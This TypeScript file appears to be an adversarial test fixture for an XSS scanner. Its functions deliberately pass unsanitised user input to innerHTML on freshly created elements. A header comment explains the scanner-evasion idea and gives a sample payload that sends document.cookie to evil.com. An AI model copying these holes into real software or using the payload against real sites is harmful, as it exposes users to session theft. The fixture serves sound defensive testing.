/**
 * ADVERSARIAL FIXTURE: XSS via createElement + innerHTML
 *
 * Vulnerability: innerHTML used on a dynamically created element
 * Evasion technique: The element is created fresh via createElement,
 * so scanners that track existing DOM element references may not
 * follow the taint through a newly created node. The element gets
 * innerHTML set with user input, then is appended to the document,
 * making the XSS payload live.
 *
 * Exploit: userInput = '<script>fetch("https://evil.com?c="+document.cookie)</script>'
 */

export function createUserCard(userInput: string): HTMLElement {
  const div = document.createElement("div");
  div.className = "user-card";
  div.innerHTML = userInput;
  return div;
}

export function renderCommentSection(comments: string[]) {
  const container = document.getElementById("comments");
  if (!container) return;

  for (const comment of comments) {
    const li = document.createElement("li");
    li.innerHTML = `<div class="comment-body">${comment}</div>`;
    container.appendChild(li);
  }
}

export function createRichEditor(initialContent: string) {
  const editorFrame = document.createElement("div");
  editorFrame.className = "rich-editor";
  editorFrame.contentEditable = "true";

  const toolbar = document.createElement("div");
  toolbar.className = "toolbar";
  toolbar.innerHTML = '<button>Bold</button><button>Italic</button>';

  const content = document.createElement("div");
  content.className = "editor-content";
  content.innerHTML = initialContent;

  editorFrame.appendChild(toolbar);
  editorFrame.appendChild(content);

  return editorFrame;
}

export function showToast(message: string, type: "info" | "error" = "info") {
  const toast = document.createElement("div");
  toast.className = `toast toast-${type}`;
  toast.innerHTML = `
    <span class="toast-icon">${type === "error" ? "⚠" : "ℹ"}</span>
    <span class="toast-message">${message}</span>
    <button class="toast-close" onclick="this.parentElement.remove()">×</button>
  `;

  document.body.appendChild(toast);
  setTimeout(() => toast.remove(), 5000);
}
